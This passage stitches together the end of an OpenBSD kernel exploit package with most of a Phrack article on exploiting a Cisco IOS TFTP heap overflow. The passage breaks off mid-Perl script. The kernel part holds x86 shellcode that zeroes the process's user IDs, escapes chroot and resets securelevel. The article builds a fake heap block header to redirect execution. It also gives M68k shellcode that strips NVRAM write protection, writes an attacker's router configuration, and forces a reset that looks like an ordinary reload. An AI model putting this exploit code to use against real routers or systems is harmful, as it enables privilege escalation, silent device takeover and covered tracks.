	which = which &gt;&gt; 4;
	printf(&quot;which: %.8x\n&quot;, which);	
	printf(&quot;addr to overwrite: %.8x\n&quot;, stat + 0x90 + (which * 0x10));
}
&lt;--&gt; ./ex_kernel/ex_setitimer_obsd.c
&lt;++&gt; ./ex_kernel/kernel_sc.s
# kernel level shellcode
# noir@olympos.org |  noir@uberhax0r.net
# 2002
.text
	.align 2,0x90

.globl _main
	.type	_main , @function
_main:

call moo
.long 0x12345678
.long 0xdeadcafe
.long 0xbeefdead
nop
nop
nop
moo:
pop  %edi
mov  (%edi),%ecx      # parent&#039;s proc addr on ecx

# update p_cred-&gt;p_ruid
mov  0x10(%ecx),%ebx  # ebx = p_cred 
xor  %eax,%eax        # eax = 0
mov  %eax,0x4(%ebx)
# p_ruid = 0

# update pc_ucred-&gt;cr_uid
mov  (%ebx),%edx      # edx = pc_ucred
mov  %eax,0x4(%edx)
# cr_uid = 0

# update p_fd-&gt;fd_rdir to break chroot()
mov  0x14(%ecx),%edx # edx = p_fd
mov  %eax,0xc(%edx)
# p_fd-&gt;fd_rdir = 0

lea  0x68(%esp),%ebp
# set ebp to normal

# find where to return: sidt technique
sidt 0x4(%edi)
mov  0x6(%edi),%ebx   # mov _idt_region in eax
mov  0x400(%ebx),%edx # _idt_region[0x80 * (2*long) = 0x400]
mov  0x404(%ebx),%ecx # _idt_region[0x404]
shr  $0x10,%ecx
sal  $0x10,%ecx
sal  $0x10,%edx
shr  $0x10,%edx
or   %ecx,%edx        # edx = ecx | edx; _Xosyscall_end

# search for Xosyscall_end+XXX: call _syscall instruction

xor  %ecx,%ecx
up:
inc  %ecx
movb (%edx,%ecx),%bl
cmpb $0xe8,%bl
jne  up

lea  (%edx,%ecx),%ebx # _Xosyscall_end+%ecx: call _syscall
inc  %ecx
mov  (%edx,%ecx),%ecx # take the displacement of the call ins.
add  $0x5,%ecx        # add 5 to displacement
add  %ebx,%ecx        # ecx = _Xosyscall_end+0x20 + disp

# search for _syscall+0xXXX: call *%eax 
# and return to where we were supposed to!
# _syscall+0x240: ff
# _syscall+0x241: d0	0x240,0x241 on obsd3.1

mov  %ecx,%edi         # ecx is addr of _syscall
movw $0xd0ff,%ax
cld
mov  $0xffffffff,%ecx 
repnz 
scasw    #scan (%edi++) for %ax

#return to *%edi
xor  %eax,%eax  #set up the return value to Success ;)
push %edi
ret
&lt;--&gt; ./ex_kernel/kernel_sc.s
&lt;++&gt; ./ex_kernel/secl_sc.s
# securelevel reset shellcode
# noir@olympos.org |  noir@uberhax0r.net
# 2002
.text
	.align 2,0x90
.globl _main
	.type	_main , @function
_main:
call moo
.long 0x12345678
moo:
pop  %edi
mov  (%edi),%ebx      # address of securelevel

xor  %eax,%eax        # eax = 0
mov  %eax,(%ebx)
# securelevel = 0

lea  0x68(%esp),%ebp
# set ebp to normal

# find where to return: sidt technique
sidt 0x4(%edi)
mov  0x6(%edi),%ebx   # mov _idt_region in eax
mov  0x400(%ebx),%edx # _idt_region[0x80 * (2*long) = 0x400]
mov  0x404(%ebx),%ecx # _idt_region[0x404]
shr  $0x10,%ecx
sal  $0x10,%ecx
sal  $0x10,%edx
shr  $0x10,%edx
or   %ecx,%edx        # edx = ecx | edx; _Xosyscall_end

# search for Xosyscall_end+XXX: call _syscall instruction

xor  %ecx,%ecx
up:
inc  %ecx
movb (%edx,%ecx),%bl
cmpb $0xe8,%bl
jne  up

lea  (%edx,%ecx),%ebx # _Xosyscall_end+%ecx: call _syscall
inc  %ecx
mov  (%edx,%ecx),%ecx # take the displacement of the call ins.
add  $0x5,%ecx        # add 5 to displacement
add  %ebx,%ecx        # ecx = _Xosyscall_end+0x20 + disp

# search for _syscall+0xXXX: call *%eax 
# and return to where we were supposed to!
# _syscall+0x240: ff
# _syscall+0x241: d0	OBSD3.1

mov  %ecx,%edi         # ecx is addr of _syscall
movw $0xd0ff,%ax
cld
mov  $0xffffffff,%ecx 
repnz 
scasw    #scan (%edi++) for %ax

#return to *%edi
xor  %eax,%eax  #set up the return value to Success ;)
push %edi
ret
&lt;--&gt; ./ex_kernel/secl_sc.s

|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x07 of 0x10

|=-------------=[ Burning the bridge: Cisco IOS exploits ]=--------------=|
|=-----------------------------------------------------------------------=|
|=----------------=[ FX of Phenoelit &lt;fx@phenoelit.de&gt; ]=----------------=|

--[ Contents

  1 - Introduction and Limitations
  2 - Identification of an overflow
  3 - IOS memory layout sniplets
  4 - A free() exploit materializes
  5 - Writing (shell)code for Cisco
  6 - Everything not covered in 1-5

--[ 1 - Introduction and Limitations

This article is to introduce the reader into the fun land of exploiting a
routing device made by Cisco Systems. It is not the final word on this
toppic and merely reflects our research results.

According to Cisco Systems, around 85% of all software issues in IOS are
the direct or indirect result of memory corruptions. By the time of this
writing, yours truly is not aware of one single case, where overflowing
something in Cisco IOS led to a direct overwrite of a return address.
Although there are things like stacks in IOS, it seems to be very uncommon
for IOS coders to use local function buffers. Therefore, most (if not all)
overflows we will encounter are some way or anyother heap based.

As a fellow researcher used to say, bugs are not an unlimited resource.
Especially overflow bugs in Cisco IOS are fairly rare and not easily
compared to each other. This article will therefore limit the discussion
to one particular bug: the Cisco IOS TFTP server filename overflow. When
using your router as a TFTP server for files in the flash filesystem, a
TFTP GET request with a long (700 characters) filename will cause the
router to crash. This happens in all IOS versions from 11.1 to 11.3. The
reader might argue the point that this is no longer a widely used branch,
but yours truly asks you to bare with him to the end of this article.

The research results and methods presented here were collected during
inspection and exploitation attempts using the already mentioned TFTP bug.
By the time of this writing, other bugs are researched and different
approaches are tested, but the here presented procedure is still seen as
the most promising for widespread use. This translates to: use your
favorite private Cisco IOS overflow and try it.

--[ 2 - Identification of an overflow

While the reader is probably used to identify stack smashing in a split
second on a commonly used operating system, he might have difficulties
identifying an overflow in IOS. As yours truly already mentioned, most
overflows are heap based. There are two different ways in IOS to identify
a heap overflow when it happens. Being connected to the console, the
reader might see output like this:

01:14:16: %SYS-3-OVERRUN: Block overrun at 2C01E14 (red zone 41414141)
-Traceback= 80CCC46 80CE776 80CF1BA 80CF300
01:14:16: %SYS-6-MTRACE: mallocfree: addr, pc
  20E3ADC,80CA1D8   20DFBE0,80CA1D8   20CF4FC,80CA1D8   20C851C,80CA1D8
  20C6F20,80CA1D8   20B43FC,80CA1D8   20AE130,80CA1D8   2075214,80CA1D8
01:14:16: %SYS-6-MTRACE: mallocfree: addr, pc
  20651E0,80CA1D8   205EF04,80CA1D8   205B338,80CA1D8   205AB80,80CA1D8
  20AFCF8,80CA1C6   205A664,80CA1D8   20AC56C,80CA1C6   20B1A88,80CA1C6
01:14:16: %SYS-6-BLKINFO: Corrupted redzone blk 2C01E14, words 382,
  alloc 80ABBFC, InUse, dealloc 206E2F0, rfcnt 1

In this case, an IOS process called &quot;Check heaps&quot;, of which we will hear
a lot more later, has identified a problem in the heap structures. After
doing so, &quot;Check heaps&quot; will cause what we call a software forced crash.
It means that the process kills the Cisco and makes it reboot in order
to get rid of the problem. We all know this behavior from users of
MS-DOS or Windows based systems. What happend here is that an A-Strip
overwrote a boundary between two heap memory blocks. This is protected by
what Cisco calls a &quot;RED ZONE&quot;, which in fact is just a static canary.

The other way a heap overflow could manifest itself on your console is an
access violation:

*** BUS ERROR ***
access address = 0x5f227998
program counter = 0x80ad45a
status register = 0x2700
vbr at time of exception = 0x4000000
special status word = 0x0045
faulted cycle was a longword read

This is the case when you are lucky and half of the work is already done.
IOS used a value that you somehow influenced and referenced to not
readable memory.  Unfortunately, those overflows are later harder to
exploit, since tracking is a lot more difficult.

At this point in time, you should try to figure out under which exact
circumstances the overflow happens - pretty much like with every other bug
you find. If the lower limit of your buffer size changes, try to make sure
that you don&#039;t play with the console or telnet(1) connections to the router
during your tests. The best is always to test the buffer length with a just
rebooted router. While it doesn&#039;t change much for most overflows, some
react differently when the system is freshly rebooted compared to a system
in use.

--[ 3 - IOS memory layout sniplets

To get any further with the overflow, we need to look at the way IOS
organizes memory. There are basically two main areas in IOS: process memory
and IO memory. The later is used for packet buffers, interface ring buffers
and so on and can be of interest for exploitation but does not provide some
of the critical things we are looking for. The process memory on the other
hand behaves a lot like dynamic heap memory in Linux.

Memory in IOS is split up in blocks. There seems to be a number of pointer
tables and meta structures dealing with the memory blocks and making sure
IOS can access them in an efficient way. But at the end of the day, the
blocks are hold together in a linked list structure and store their
management information mostly inline. This means, every memory block has
a header, which contains information about the block, it&#039;s previous one
and the next one in the list.

     +--------------+
 .-- | Block A      | &lt;-.
 |   +--------------+   |
 +-&gt; | Block B      | --+
     +--------------+
     | Block C      |
     +--------------+

The command &quot;show memory processor&quot; clearly shows the linked list
structure.

A memory block itself consists of the block header with all the inline
management information, the data part where the actual data is stored
and the red zone, which we already encountered. The format is as follows:

 |&lt;-  32 bit  -&gt;|        Comment
 +--------------+
 | MAGIC        |        Static value 0xAB1234CD
 +--------------+
 | PID          |        IOS process ID
 +--------------+
 | Alloc Check  |	 Area the allocating process uses for checks
 +--------------+
 | Alloc name   |        Pointer to string with process name
 +--------------+
 | Alloc PC     |	 Code address that allocated this block
 +--------------+
 | NEXT BLOCK   |        Pointer to the next block
 +--------------+
 | PREV BLOCK   |        Pointer to the previous block
 +--------------+
 | BLOCK SIZE   |        Size of the block (MSB marks &quot;in use&quot;)
 +--------------+
 | Reference #  |        Reference count (again ???)
 +--------------+
 | Last Deallc  |	 Last deallocation address
 +--------------+
 |   DATA       |
 |              |
 ....
 |              |
 +--------------+
 | RED ZONE     |        Static value 0xFD0110DF
 +--------------+

In case this memory block is used, the size field will have it&#039;s most
significant bit set to one. The size is represented in words (2 bytes),
and does not include the block overhead. The reference count field is
obviously designed to keep track of the number of processes using this
block, but yours truly has never seen this being something else then 1
or 0. Also, there seem to be no checks for this field in place.

In case the memory block is not used, some more management data is
introduced at the point where the real data was stored before:

 | [BLOCK HEAD] |
 +--------------+
 | MAGIC2       |        Static value 0xDEADBEEF
 +--------------+
 | Somestuff    |
 +--------------+
 | PADDING      |
 +--------------+
 | PADDING      |
 +--------------+
 | FREE NEXT    |        Pointer to the next free block
 +--------------+
 | FREE PREV    |        Pointer to the previous free block
 +--------------+
 |              |
 ....
 |              |
 +--------------+
 | RED ZONE     |        Static value 0xFD0110DF
 +--------------+

Therefore, a free block is an element in two different linked lists:
One for the blocks in general (free or not), another one for the list of
free memory blocks. In this case, the reference count will be zero and
the MSB of the size field is not set. Additionally, if a block was used
at least once, the data part of the block will be filled with 0x0D0D0D0D.
IOS actually overwrites the block data when a free() takes place to prevent
software issues from getting out of hand.

At this point, yours truly would like to return to the toppic of the &quot;Check
heaps&quot; process. It is here to run about once a minute and checks the doubly
linked lists of blocks. It basically walks them down from top to buttom to
see if everything is fine. The tests employed seem to be pretty extensive
compared to common operating systems such as Linux. As far as yours truly
knows, this is what it checks:
	1) Doest the block being with MAGIC (0xAB1234CD)?
	2) If the block is in use (MSB in size field is set), check if the
	   red zone is there and contains 0xFD0110DF.
	3) Is the PREV pointer not NULL?
	4) If there is a NEXT pointer ...
	4.1) Does it point right after the end of this block?
	4.2) Does the PREV pointer in the block pointed to by NEXT point
	     back to this block&#039;s NEXT pointer?
	5) If the NEXT pointer is NULL, does this block end at a memory
	   region/pool boundary [NOTE: not sure about this one].
	6) Does the size make sense? [NOTE: The exact test done here is
	   still unknown]

If one of these tests is not satisfied, IOS will declare itself unhappy and
perform a software forced crash. To some extend, one can find out which
test failed by taking a look at the console output line that says
&quot;validblock_diagnose = 1&quot;. The number indicates what could be called &quot;class
of tests&quot;, where 1 means that the MAGIC was not correct, 3 means that the
address is not in any memory pool and 5 is really a bunch of tests but
mostly indicates that the tests lined out in point 4.1 and 4.2 failed.

--[ 4 - A free() exploit materializes

Now that we know a bit about the IOS memory structure, we can plan to
overflow with some more interesting data than just 0x41. The basic idea is
to overwrite the next block header, hereby provide some data to IOS, and
let it work with this data in a way that gives us control over the CPU. How
this is usually done is explained in [1]. The most important difference
here is, that we first have to make &quot;Check heaps&quot; happy. Unfortunately,
some of the checks are also performed when memory is allocated or free()ed.
Therefore, slipping under the timeline of one minute between two &quot;Check
heaps&quot; runs is not an option here.

The biggest problems are the PREV pointer check and the size field. Since
the vulnerability we are working with here is a string overflow, we also
have the problem of not being able to use 0x00 bytes. Let&#039;s try to deal
with the issues we have one by one.

The PREV pointer has to be correct. Yours truly has not found any way to
use arbitrary values here. The check outlined in the checklist as 4.2 is a
serious problem, since it is done on the block we are sitting in - not the
one we are overflowing. To illustrate the situation:

     +--------------+
     | Block Head   |
     ...
     | AAAAAAAAAAAA |    &lt;--- You are here
     | AAAAAAAAAAAA |
     | AAAAAAAAAAAA |
     +--------------+
     | RED ZONE     |    &lt;--- Your data here
     +==============+
     | Block Head   |
     ...

We will call the uppermost block, who&#039;s data part we are overflowing, the
&quot;host block&quot;, because it basically &quot;hosts&quot; our evildoing. For the sake of
clarity, we will call the overwritten block header the &quot;fake block&quot;, since
we try to fake it&#039;s contents.

So, when &quot;Check heaps&quot; or comparable checks during malloc() and free() are
performed on our host block, the overwrite is already noticed. First of
all, we have to append the red zone canary to our buffer. If we overflow
exactly with the number of bytes the buffer can hold and append the red
zone dword 0xFD0110DF, &quot;Check heaps&quot; will not complain. From here one, it&#039;s
fair game up to the PREV ptr - because the values are either static (MAGIC)
or totally ignored (PID, Alloc ptrs).

Assumed we overwrite RED ZONE, MAGIC, PID, the three Alloc pointer, NEXT
and PREV, a check performed on the host block will already trigger a
software forced crash, since the PREV pointer we overwrote in the next
block does not point back to the host block. We have only one way today to
deal with this issue: we crash the device. The reason behind this is, that
we put it in a fairly predictable memory state. After a reboot, the memory
is more or less structured the same way. This also depends on the amount
of memory available in the device we are attacking and it&#039;s certainly not a
good solution. When crashing the device the first time with an A-Strip, we
can try to grab logging information off the network or the syslog server if
such a thing is configured. Yours truly is totally aware of the fact that
this prevents real-world application of the technique. For this article,
let&#039;s just assume you can read the console output.

Now that we know the PREV pointer to put into the fake block, let&#039;s go on.
For now ignoring the NEXT pointer, we have to deal with the size field. The
fact that this is a 32bit field and we are doing a string overflow prevents
us from putting reasonable numbers in there. The smallest number for a used
block would be 0x80010101 and for an unused one 0x01010101. This is much
more than IOS would accept. But to make a long story short, putting
0x7FFFFFFF in there will pass the size field checks. As simple as that.

In this particular case, as with many application level service overflows
in IOS, our host block is one of the last blocks in the chain. The most
simple case is when the host block is the next-to-last block. And viola,
this is the case with the TFTP server overflow. In other cases, the attack
involves creating more than one fake block header and becomes increasingly
complicated but not impossible. But from this point on, the discussion is
pretty much centered around the specific bug we are dealing with.

Assumed normal operation, IOS will allocate some block for storing the
requested file name. The block after that is the remaining free memory.
When IOS is done with the TFTP operation, it will free() the block it just
allocated. Then, it will find out that there are two free blocks - one
after the other - in memory. To prevent memory fragmentation (a big problem
on heavy load routers), IOS will try to coalesce (merge) the free blocks
into one. By doing so, the pointers for the linked lists have to be
adjusted. The NEXT and PREV pointers of the block before that and the block
after that (the remaining free memory) have to be adjusted to point to each
other. Additionally, the pointers in the free block info FREE NEXT and FREE
PREV have to be adjusted, so the linked list of free blocks is not broken.

Out of the sudden, we have two pointer exchange operations that could
really help us. Now, we know that we can not choose the pointer in PREV.
Although, we can choose the pointer in NEXT, assumed that &quot;Check heaps&quot;
does not fire before our free() tok place, this only allowes us to write
the previous pointer to any writable location in the routers memory. Being
usefull by itself, we will not look deeper into this but go on to the FREE
NEXT and FREE PREV pointers. As the focused reader surely noticed, these
two pointers are not validated by &quot;Check heaps&quot;.

What makes exploitation of this situation extremely convenient is that
fact, that the pointer exchange in FREE PREV and FREE NEXT only relies on
the values in those two fields. What happens during the merge operation is
this:
	+ the value in FREE PREV is written to where FREE NEXT points to
	  plus an offset of 20 bytes
	+ the value in FREE NEXT is written to where FREE PREV points to

The only thing we need now is a place to write a pointer to. As with many
other pointer based exploits, we are looking for a fairly static location
in memory to do this. Such a static location (changes per IOS image) is the
process stack of standard processes loaded right after startup. But how do
we find it?

In the IOS memory list, there is an element called the &quot;Process Array&quot;.
This is a list of pointers - one for every process currently running in
IOS. You can find it&#039;s location by issuing a &quot;show memory processor
allocating-process&quot; command (output trimmed):

radio#show memory processor allocating-process

          Processor memory

 Address Bytes Prev.   Next    Ref  Alloc Proc Alloc PC  What
258AD20   1504 0       258B32C   1  *Init*     20D62F0   List Elements
258B32C   3004 258AD20 258BF14   1  *Init*     20D6316   List
...
258F998   1032 258F914 258FDCC   1  *Init*     20E5108   Process Array
258FDCC   1000 258F998 25901E0   1  Load Meter 20E54BA   Process Stack
25901E0    488 258FDCC 25903F4   1  Load Meter 20E54CC   Process
25903F4    128 25901E0 25904A0   1  Load Meter 20DD1CE   Process Events

This &quot;Process Array&quot; can be displayed by the &quot;show memory&quot; command:

radio#show memory 0x258F998
0258F990:                   AB1234CD FFFFFFFE          +.4M...~
0258F9A0: 00000000 020E50B6 020E5108 0258FDCC  ......P6..Q..X}L
0258F9B0: 0258F928 80000206 00000001 020E1778  .Xy(...........x
0258F9C0: 00000000 00000028 02590208 025D74C0  .......(.Y...]t@
0258F9D0: 02596F3C 02598208 025A0A04 025A2F34  .Yo&lt;.Y...Z...Z/4
0258F9E0: 025AC1FC 025BD554 025BE920 025BFD2C  .ZA|.[UT.[i .[},
0258F9F0: 025E6FF0 025E949C 025EA95C 025EC484  .^op.^...^)\.^D.
0258FA00: 025EF404 0262F628 026310DC 02632FD8  .^t..bv(.c.\.c/X
0258FA10: 02634350 02635634 0263F7A8 026418C0  .cCP.cV4.cw(.d.@
0258FA20: 026435FC 026475E0 025D7A38 026507E8  .d5|.du`.]z8.e.h
0258FA30: 026527DC 02652AF4 02657200 02657518  .e&#039;\.e*t.er..eu.
0258FA40: 02657830 02657B48 02657E60 0269DCFC  .ex0.e{H.e~`.i\|
0258FA50: 0269EFE0 026A02C4 025DD870 00000000  .io`.j.D.]Xp....
0258FA60: 00000000 025C3358 026695EC 0266A370  .....\3X.f.l.f#p

While you also see the already discussed block header format in action now,
the interesting information starts at 0x0258F9C4. Here, you find the number
of processes currently running on IOS. They are ordered by their process
ID. What we are looking for is a process that gets executed every once in a
while. The reason for this is, if we modify something in the process data
structures, we don&#039;t want the process being active at this point in time,
so that the location we are overwriting is static. For this reason, yours
truly picked the &quot;Load Meter&quot; process, which is there to measure the system
load and is fired off about every 30 seconds. Let&#039;s get the PID of
&quot;Load Meter&quot;:

radio#show processes cpu
CPU utilization for five seconds: 2%/0%; one minute: 3%; five minutes: 3%
 PID  Runtime(ms)  Invoked  uSecs    5Sec   1Min   5Min TTY Process
   1          80      1765     45   0.00%  0.00%  0.00%   0 Load Meter

Well, conveniently, this process has PID 1. Now, we check the memory
location the &quot;Process Array&quot; points to. Yours truly calls this memory
location &quot;process record&quot;, since it seems to contain everything IOS needs
to know about the process. The first two entries in the record are:

radio#sh mem 0x02590208
02590200:                   0258FDF4 025901AC          .X}t.Y.,
02590210: 00001388 020E488E 00000000 00000000  ......H.........
02590220: 00000000 00000000 00000000 00000000  ................

The first entry in this record is 0x0258FDF4, which is the process stack.
You can compare this to the line above that says &quot;Load Meter&quot; and &quot;Process
Stack&quot; on it in the output of &quot;show memory processor allocating-process&quot;.
The second element is the current stack pointer of this process
(0x025901AC). By now it should also be clear why we want to pick a process
with low activity. But surprisingly, the same procedure also works quite
well with busier processes such as &quot;IP Input&quot;. Inspecting the location of
the stack pointer, we see something quite familiar:

radio#sh mem 0x025901AC
025901A0:                            025901C4              .Y.D
025901B0: 020DC478 0256CAF8 025902DE 00000000  ..Dx.VJx.Y.^....

This is classic C calling convention: first we find the former frame
pointer and then we find the return address. Therefore, 0x025901B0 is the
address we are targeting to overwrite with a pointer supplied by us.

The only question left is: Where do we want the return address to point to?
As already mentioned, IOS will overwrite the buffer we are filling with
0x0D0D0D0D when the free() is executed - so this is not a good place to
have your code in. On the other hand, the fake block&#039;s data section is
already considered clean from IOS&#039;s point of view, so we just append our
code to the fake block header we already have to send. But what&#039;s the
address of this? Well, since we have to know the previous pointer, we can
calculate the address of our code as offset to this one - and it turns out
that this is actually a static number in this case. There are other, more
advanced methods to deliver the code to the device, but let&#039;s keep focused.

The TFTP filename we are asking for should now have the form of:

 +--------------+
 | AAAAAAAAAAAA |
 ...
 | AAAAAAAAAAAA |
 +--------------+
 | FAKE BLOCK   |
 |              |
 ....
 |              |
 +--------------+
 | CODE         |
 |              |
 ....
 +--------------+

At this point, we can build the fake block using all the information we
gathered:

    char                fakeblock[] =
        &quot;\xFD\x01\x10\xDF&quot;      // RED
        &quot;\xAB\x12\x34\xCD&quot;      // MAGIC
        &quot;\xFF\xFF\xFF\xFF&quot;      // PID
        &quot;\x80\x81\x82\x83&quot;      //
        &quot;\x08\x0C\xBB\x76&quot;      // NAME
        &quot;\x80\x8a\x8b\x8c&quot;      //

        &quot;\x02\x0F\x2A\x04&quot;      // NEXT
        &quot;\x02\x0F\x16\x94&quot;      // PREV

        &quot;\x7F\xFF\xFF\xFF&quot;      // SIZE
        &quot;\x01\x01\x01\x01&quot;      //
        &quot;\xA0\xA0\xA0\xA0&quot;      // padding
        &quot;\xDE\xAD\xBE\xEF&quot;      // MAGIC2
        &quot;\x8A\x8B\x8C\x8D&quot;      //
        &quot;\xFF\xFF\xFF\xFF&quot;      // padding
        &quot;\xFF\xFF\xFF\xFF&quot;      // padding

        &quot;\x02\x0F\x2A\x24&quot;      // FREE NEXT (in BUFFER)
        &quot;\x02\x59\x01\xB0&quot;      // FREE PREV (Load Meter return addr)
        ;

When sending this to the Cisco, you are likely to see something like this:

*** EXCEPTION ***
illegal instruction interrupt
program counter = 0x20f2a24
status register = 0x2700
vbr at time of exception = 0x4000000

depending on what comes after your fake block header. Of course, we did not
provide code for execution yet. But at this point in time, we got the CPU
redirected into our buffer.

--[ 5 - Writing (shell)code for Cisco

Before one can write code for the Cisco platform, you have to decide on the
general processor architecture you are attacking. For the purpose of this
paper, we will focus on the lower range devices running on Motorola 68k
CPUs.

Now the question is, what do you want to do with your code on the system.
Classic shell code design for commonly used operating system platforms uses
syscalls or library functions to perform some port binding and provide
shell access to the attacker. The problem with Cisco IOS is, that we will
have a hard time keeping it alive after we performed our pointer games.
This is because in contrast to &quot;normal&quot; daemons, we destroyed the memory
management of the operating system core and we can not expect it to cope
with the mess we left for it.

Additionally, the design of IOS does not feature transparent syscalls as
far as yours truly knows. Because of it&#039;s monolithic design, things are
linked together at build time. There might be ways to call different
subfunctions of IOS even after an heap overflow attack, but it appears to
be an inefficient route to take for exploitation and would make the whole
process even more instable.

The other way is to change the routers configuration and reboot it, so it
will come up with the new config, which you provided. This is far more
simpler than trying to figure out syscalls or call stack setups. The idea
behind this approach is, that you don&#039;t need any IOS functionality anymore.
Because of this, you don&#039;t have to figure out addresses and other vital
information about the IOS. All you have to know is which NVRAM chips are
used in the box and where there are mapped. This might sound way more
complicated than identifying functions in an IOS image - but is not. In
contrast to common operating systems on PC platforms, where the number of
possible hardware combinations and memory mappings by far exceedes a
feasable mapping range, it&#039;s the other way around for Cisco routers. You
can have more than ten different IOS images on a single platform - and this
is only one branch - but you always have the same general memory layout and
the ICs don&#039;t change for the most part. The only thing that may differ
between two boxes are the modules and the size of available memory (RAM,
NVRAM and Flash), but this is not of big concern for us.

The non-volatile random access memory (NVRAM) stores the configuration of a
Cisco router in most cases. The configuration itself is stored in plain
text as one continious C-style string or text file and is terminated by the
keyword &#039;end&#039; and one or more 0x00 bytes. A header structure contains
information like the IOS version that created this configuration, the size
of it and a checksum. If we replace the config on the NVRAM with our own
and calculate the numbers for the header structure correctly, the router
will use our IP addresses, routings, access lists and (most important)
passwords next time it reloads.

As one can see on the memory maps [2], there are one (in the worst case
two) possible memory addresses for the NVRAM for each platform. Since
the NVRAM is mapped into the memory just like most memory chips are, we
can access it with simple memory move operations. Therefore, the only thing
we need for our &quot;shell&quot; code is the CPU (M68k), it&#039;s address and data bus
and the cooperation of the NVRAM chip.

There are things to keep in mind about NVRAM. First of all, it&#039;s slow to
write to. The Xicor chips yours truly encountered on Cisco routers require
that after a write, the address lines are kept unchanged for the time the
chip needs to write the data. A control register will signal when the write
operation is done. Since the location of this control register is not known
and might not be the same for different types of the same platform, yours
truly prefers to use delay loops to give the chip time to write the data -
since speed is not the attackers problem here.

Now, that we know pretty much what we want to do, we can go on and look at
the &quot;how&quot; part of things. First of all, you need to produce assembly for
the target platform. A little known fact is, that IOS is actually build (at
least some times) using GNU compilers. Therefore, the binutils[3] package
can be compiled to build Cisco compatible code by setting the target
platform for the ./configure run to --target=m68k-aout. When you are done,
you will have a m68k-aout-as binary, which can produce your code and a
m68k-aout-objdump to get the OP code values.

In case the reader is fluent in Motorola 68000 assembly, I would like to
apologize for the bad style, but yours truly grew up on Intel.
Optimizations and style guides are welcome. Anyway, let&#039;s start coding.

For a string overflow scenario like this one, the recommended way for small
code is to use self-modification. The main code will be XOR&#039;d with a
pattern like 0x55 or 0xD5 to make sure that no 0x00 bytes show up. A
bootstrap code will decode the main code and pass execution on to it. The
Cisco 1600 platform with it&#039;s 68360 does not have any caching issues to
worry us (thanks to LSD for pointing this out), so the only issue we have
is avoiding 0x00 bytes in the bootstrap code. Here is how it works:

--- bootstrap.s ---
	.globl _start
_start:
        | Remove write protection for NVRAM.
	| Protection is Bit 1 in BR7 for 0x0E000000
        move.l  #0x0FF010C2,%a1
        lsr     (%a1)

        | fix the brance opcode
	| &#039;bne decode_loop&#039; is OP code 0x6600 and this is bad
        lea     broken_branch+0x101(%pc),%a3
        sub.a   #0x0101,%a3
        lsr     (%a3)

        | perform dummy load, where 0x01010101 is then replaced
        | by our stack ptr value due to the other side of the pointer
	| exchange
        move.l  #0x01010101,%d1

        | get address of the real code appended plus 0x0101 to
	| prevent 0x00 bytes
        lea     xor_code+0x0101(%pc),%a2
        sub.a   #0x0101,%a2
        | prepare the decode register (XOR pattern)
        move.w  #0xD5D5,%d1

decode_loop:
	| Decode our main payload code and the config
        eor.w   %d1,(%a2)+
	| check for the termination flag (greetings to Bine)
        cmpi.l  #0xCAFEF00D,(%a2)
broken_branch:
        | this used to be &#039;bne decode_loop&#039; or 0x6600FFF6
        .byte   0xCC,0x01,0xFF,0xF6

xor_code:

--- end bootstrap.s ---

You may assemble the code into an object file using:
linux# m68k-aout-as -m68360 -pic --pcrel -o bootstrap.o bootstrap.s

There are a few things to say about the code. Number one are the first two
instructions. The CPU we are dealing with supports write protection for
memory segments [4]. Information about the memory segments is stored in
so-called &quot;Base Registers&quot;, BR0 to BR7. These are mapped into memory at
0x0FF00000 and later. The one we are interested in (BR7) is at 0x0FF010C2.
Bit0 tells the CPU if this memory is valid and Bit1 if it&#039;s write
protected, so the only thing we need to do is to shift the lower byte one
Bit to the right. The write protection Bit is cleared and the valid Bit is
still in place.

The second thing of mild interest is the broken branch code, but the
explaination in the source should make this clear: the OP code of &quot;BNE&quot;
unfortunately is 0x6600. So we shift the whole first word one to the right
and when the code runs, this is corrected.

The third thing is the dummy move to d1. If the reader would refer back to
the place we discussed the pointer exchange, he will notice that there is a
&quot;back&quot; part in this operation: namely the stack address is written to our
code plus 20 bytes (or 0x14). So we use a move operation that translates to
the OP code of 0x223c01010101, located at offset 0x12 in our code. After
the pointer exchange takes place, the 0x01010101 part is replaced by the
pointer - which is then innocently moved to the d1 register and ignored.

When this code completed execution, the appended XOR&#039;d code and config
should be in memory in all clear text/code. The only thing we have to do
now is copy the config in the NVRAM. Here is the appropriate code to do
this:

--- config_copy.s ---
        .globl  _start
_start:

	| turn off interrupts
        move.w	#0x2700,%sr;
	move.l	#0x0FF010C2,%a1
	move.w	#0x0001,(%a1)

	| Get position of appended config and write it with delay
	lea	config(%pc),%a2
	move.l	#0x0E0002AE,%a1
	move.l	#0x00000001,%d2

copy_confg:
	move.b	(%a2)+,(%a1)+
	| delay loop
	move.l	#0x0000FFFF,%d1
  write_delay:
	  subx	%d2,%d1
	  bmi	write_delay
	cmp.l	#0xCAFEF00D,(%a2)
	bne	copy_confg

	| delete old config to prevent checksum errors
delete_confg:
	move.w	#0x0000,(%a1)+
	move.l	#0x0000FFFF,%d1
	| delay loop
  write_delay2:
	  subx	%d2,%d1
	  bmi	write_delay2
	cmp.l	#0x0E002000,%a1
	blt	delete_confg

	|  perform HARD RESET
CPUReset:
        move.w	#0x2700,%sr
        moveal	#0x0FF00000,%a0
        moveal	(%a0),%sp
        moveal	#0x0FF00004,%a0
        moveal	(%a0),%a0
        jmp	(%a0)

config:
--- end config_copy.s ---

There is no particular magic about this part of the code. The only thing
worth noticing is the final CPU reset. There is reason why we do this. If
we just crash the router, there might be exception handlers in place to
save the call stack and other stuff to the NVRAM. This might change
checksums in an unpredictable way and we don&#039;t want to do this. The other
reason is, that a clean reset makes the router look like it was rebooted by
an administrator using the &quot;reload&quot; command. So we don&#039;t raise any
questions despite the completely changed configuration ;-)

The config_copy code and the config itself must now be XOR encoded with the
pattern we used in the bootstrap code. Also, you may want to put the code
into a nice char array for easy use in a C program. For this, yours truly
uses a dead simple but efficient Perl script:

--- objdump2c.pl ---
#!/usr/bin/perl

$pattern=hex(shift);
$addressline=hex(shift);

while (&lt;STDIN&gt;) {
    chomp;
    if (/[0-9a-f]+:\t/) {
	(undef,$hexcode,$mnemonic)=split(/\t/,$_);
	$hexcode=~s/ //g;
	$hexcode=~s/([0-9a-f]{2})/$1 /g;

	$alc=sprintf(&quot;%08X&quot;,$addressline);
	$addressline=$addressline+(length($hexcode)/3);

	@bytes=split(/ /,$hexcode);
	$tabnum=4-(length($hexcode)/8);
	$tabs=&quot;\t&quot;x$tabnum;
	$hexcode=&quot;&quot;;
	foreach (@bytes) {
		$_=hex($_);
